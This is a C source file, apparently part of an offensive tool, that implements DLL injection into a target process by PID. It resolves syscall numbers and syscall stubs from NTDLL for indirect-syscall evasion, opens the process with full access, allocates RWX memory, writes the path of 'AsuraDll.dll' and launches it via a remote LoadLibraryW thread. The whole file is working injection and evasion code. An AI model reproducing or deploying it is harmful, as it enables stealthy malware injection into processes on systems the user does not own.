#include "asurautils.h"
#include "eibon_no_sho.h"

DWORD thNtOpenProcess;
DWORD thNtWriteVirtualMemory;
DWORD thNtWaitForSingleObject;
DWORD thNtAllocateVirtualMemory;
DWORD thNtClose;

UINT_PTR NtOpenProcessSys;
UINT_PTR NtWriteVirtualMemorySys;
UINT_PTR NtWaitForSingleObjectSys;
UINT_PTR NtAllocateVirtualMemorySys;
UINT_PTR NtCloseSys;

BOOL STATE = TRUE;

HMODULE getMod(IN LPCWSTR modName)
{

    HMODULE hModule = NULL;

    printf("trying to get a handle to %S\n", modName);
    hModule = GetModuleHandleW(modName);

    if (hModule == NULL)
    {
        printf("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else
    {
        printf("got a handle to the module!\n");
        printf("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }
}

VOID IndirectPrelude(
    IN HMODULE hNTDLL,
    IN LPCSTR NtFunction,
    OUT DWORD *SSN,
    OUT UINT_PTR *Syscall)
{

    UINT_PTR NtFunctionAddress = NULL;
    BYTE SyscallOpcode[2] = {0x0F, 0x05};

    printf("beginning indirect prelude...\n");
    printf("trying to get the address of %s...\n", NtFunction);
    NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

    if (NtFunctionAddress == NULL)
    {
        printf("[GetProcAddress] failed, error: 0x%lx\n", GetLastError());
    }

    printf("got the address of %s! (0x%p)\n", NtFunction, NtFunctionAddress);
    *SSN = ((PBYTE)(NtFunctionAddress + 4))[0];
    *Syscall = NtFunctionAddress + 0x12;

    if (memcmp(SyscallOpcode, *Syscall, sizeof(SyscallOpcode)) == 0)
    {
        printf("syscall signature (0x0F, 0x05) matched, found a valid syscall instruction!\n");
    }
    else
    {
        printf("expected syscall signature: 0x0f,0x05 didn't match.\n");
        return;
    }

    printf("got the SSN of %s (0x%lx)\n", NtFunction, *SSN);
    printf("\n\t| %s \n", NtFunction);
    printf("\n\t|\n\t| ADDRESS\t| 0x%p\n\t| SYSCALL\t| 0x%p\n\t| SSN\t\t| 0x%lx\n\t|____________________________________\n\n", NtFunctionAddress, *Syscall, *SSN);
}

BOOL
dll_injection(
    DWORD PID
){
    //this actually worked, now move all of this shit do indirect syscall, lol
    HMODULE hNTDLL = NULL;
    HMODULE hKernel32 = NULL;
    NTSTATUS STATUS = NULL;
    PVOID rBuffer = NULL;
    HANDLE hThread = NULL;
    HANDLE hProcess = NULL;

    wchar_t dllName[] = L"AsuraDll.dll";
    wchar_t wpath[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, wpath);

    size_t path_length = wcslen(wpath);
    size_t name_length = wcslen(dllName);

    WCHAR sephiroth[MAX_PATH + name_length + 1];

    wcscpy(sephiroth, wpath);
    if (sephiroth[path_length - 1] != L'\\')
    {
        wcscat(sephiroth, L"\\");
    }

    wcscat(sephiroth, dllName);

    SIZE_T sephisize = sizeof(sephiroth);
    SIZE_T bytesWritten = 0;

    if (!PID){
        printf("PID not provided\n");
        return FALSE;
    }

    CLIENT_ID CID = {(HANDLE)PID, 0};
    OBJECT_ATTRIBUTES OA = {sizeof(OA), 0};
    hKernel32 = GetModuleHandleW(L"Kernel32");
    LPTHREAD_START_ROUTINE thLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

    hNTDLL = getMod(L"NTDLL");
    IndirectPrelude(hNTDLL, "NtOpenProcess", &thNtOpenProcess, &NtOpenProcessSys);
    IndirectPrelude(hNTDLL, "NtAllocateVirtualMemory", &thNtAllocateVirtualMemory, &NtAllocateVirtualMemorySys);
    IndirectPrelude(hNTDLL, "NtWriteVirtualMemory", &thNtWriteVirtualMemory, &NtWriteVirtualMemorySys);
    IndirectPrelude(hNTDLL, "NtWaitForSingleObject", &thNtWaitForSingleObject, &NtWaitForSingleObjectSys);

    printf("indirect prelude finished! beginning injection\n");
    printf("getting a handle on the process (%ld)...\n", PID);
    STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (!STATUS == STATUS_SUCCESS)
    {
        printf("[NtOpenProcess] failed to get a handle on the process (%ld), error: 0x%x\n", PID, STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    printf("got a handle to the process!\n");
    STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &sephisize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!STATUS == STATUS_SUCCESS)
    {
        printf("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x\n", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    printf("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions!\n");

    STATUS = NtWriteVirtualMemory(hProcess, rBuffer, sephiroth, sizeof(sephiroth), &bytesWritten);
    if (!STATUS == STATUS_SUCCESS)
    {
        printf("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x\n", STATUS);
        STATE = FALSE;
        goto CLEAN_UP;
    }
    printf("wrote %zu-bytes to allocated buffer!\n", bytesWritten);

    printf("creating thread, beginning execution\n");

    hThread = CreateRemoteThread(hProcess, NULL, 0,thLoadLibraryW,rBuffer,0,0);
    if (hThread == NULL){
        printf("Error when creating remote thread, error: 0x%x\n", GetLastError());
        STATE = FALSE;
        goto CLEAN_UP;
    }

    //*Just to see the performance
    FILETIME ftCreation, ftExit, ftKernel, ftUser;
    GetThreadTimes(hThread, &ftCreation, &ftExit, &ftKernel, &ftUser);
    ULARGE_INTEGER startExecutionTime;
    startExecutionTime.LowPart = ftUser.dwLowDateTime;
    startExecutionTime.HighPart = ftUser.dwHighDateTime;

    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if(!STATUS == STATUS_SUCCESS){
        printf("[NtWaitForSingleObject] failed to wait for object (hThread), error: 0x%x\n", STATUS);
        STATE = FALSE;
        goto CLEAN_UP;
    }
    DWORD dwWaitResult = WaitForSingleObject(hThread, INFINITE);

    // Check the wait result
    if (dwWaitResult != WAIT_OBJECT_0)
    {
        printf("error on handle: 0x%p\n",GetLastError());
    }
    //...
    GetThreadTimes(hThread, &ftCreation, &ftExit, &ftKernel, &ftUser);
    ULARGE_INTEGER endExecutionTime;
    endExecutionTime.LowPart = ftUser.dwLowDateTime;
    endExecutionTime.HighPart = ftUser.dwHighDateTime;

    // Calculate the execution time
    ULONGLONG executionTime = endExecutionTime.QuadPart - startExecutionTime.QuadPart;

    // Convert to milliseconds
    double executionTimeInMilliseconds = executionTime / 10000.0;

    printf("Thread execution time: %.2f milliseconds\n", executionTimeInMilliseconds);

    printf("Exiting... bye!\n");

CLEAN_UP:

    if(hThread){
        NtClose(hThread);
        printf("[0x%p] Closed handle on thread.\n", hThread);
    }
    if (hProcess){
        NtClose(hProcess);
        printf("[0x%p Closed handle on process.\n]", hProcess);
    }

    return STATE;

}

